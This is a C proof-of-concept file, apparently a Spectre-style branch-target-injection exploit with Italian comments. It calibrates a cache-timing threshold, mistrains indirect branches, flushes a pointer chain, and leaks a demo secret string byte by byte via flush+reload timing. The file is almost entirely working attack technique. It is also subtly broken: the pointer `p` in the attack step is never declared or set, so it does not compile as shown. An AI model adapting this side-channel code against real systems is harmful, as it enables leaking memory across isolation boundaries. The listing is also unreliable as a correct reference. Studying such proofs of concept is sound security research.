#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define STRIDE 16384
#define TRAINING_LOOPS 1000
#define ATTACK_REPS 4000

// Struttura per la catena di puntatori (Pointer Chasing)
struct node {
    struct node *next;
};

uint8_t sensor_array[256 * STRIDE];
uint8_t secret_data[] = "supersegreto";


void funzione_dummy(size_t x) {
    (void)x; // non fa nulla
}

void __attribute__((aligned(4096))) funzione_training(size_t x) { (void)x; }

void __attribute__((aligned(4096))) funzione_vittima(size_t x) {
    uint8_t value = secret_data[x];
    volatile uint8_t *addr = &sensor_array[value * STRIDE];
    volatile uint8_t junk = *addr; // 'volatile' per evitare che il compilatore la elimini
    (void)junk;
}

int main() {
    size_t secret_len = strlen((char *)secret_data);
    unsigned int aux;
    
    for (int i = 0; i < 256 * STRIDE; i++) sensor_array[i] = 1;

    // --- CALIBRAZIONE SOGLIA ---
    uint64_t t1, t2;
    volatile uint8_t *addr_calib = &sensor_array[128 * STRIDE];
    _mm_clflush((void*)addr_calib);
    _mm_mfence();
    t1 = __rdtscp(&aux);
    (void)*addr_calib;
    _mm_lfence();
    t2 = __rdtscp(&aux);
    uint64_t t_miss = t2 - t1;

    t1 = __rdtscp(&aux);
    (void)*addr_calib;
    _mm_lfence();
    t2 = __rdtscp(&aux);
    uint64_t t_hit = t2 - t1;
    
    unsigned int CACHE_THRESHOLD = (unsigned int)((t_hit + t_miss) / 2);

    printf("Calibrazione: HIT %lu, MISS %lu, SOGLIA %u\n", t_hit, t_miss, CACHE_THRESHOLD);

    // --- PREPARAZIONE CATENA DI PUNTATORI ---
    struct node n1, n2, n3;
    // La catena punta alla funzione sicura (training)
    n1.next = &n2;
    n2.next = &n3;
    n3.next = (struct node *)funzione_training;

    for (size_t secret_index = 0; secret_index < secret_len; secret_index++) {
        int scores[256] = {0};

        for (int rep = 0; rep < ATTACK_REPS; rep++) {
            
            // 1. TRAINING (BTB Poisoning)
            void (*indirect_jump)(size_t);
            for (int i = 0; i < TRAINING_LOOPS; i++) {
                indirect_jump = funzione_vittima;
                indirect_jump(0);
            }

            // 2. FLUSH SENSOR ARRAY
            for (int i = 0; i < 256; i++) _mm_clflush(&sensor_array[i * STRIDE]);
            
            // 3. FLUSH DELLA CATENA 
            _mm_clflush(&n1);
            _mm_clflush(&n2);
            _mm_clflush(&n3);
            _mm_mfence();

            // 4. ATTACCO SPECULATIVO
            p = p->next; 
            p = p->next; 
            
            void (*final_jump)(size_t) = (void (*)(size_t))p->next; 
            final_jump(secret_index);
            
            _mm_lfence(); 

            // 5. RELOAD
            for (int i = 0; i < 256; i++) {
                int mix_i = ((i * 167) + 13) & 255;
                volatile uint8_t *addr = &sensor_array[mix_i * STRIDE];
                t1 = __rdtscp(&aux);
                (void)*addr;
                _mm_lfence();
                t2 = __rdtscp(&aux);
                
                if ((t2 - t1) < CACHE_THRESHOLD && mix_i != 0) scores[mix_i]++;
            }
        }

        int best = -1, max_s = 0;
        for (int i = 1; i < 256; i++) {
            if (scores[i] > max_s) { max_s = scores[i]; best = i; }
        }
        printf("Pos %zu: '%c' (Score: %d)\n", secret_index, (best > 31 && best < 127) ? best : '?', max_s);
    }
    return 0;
}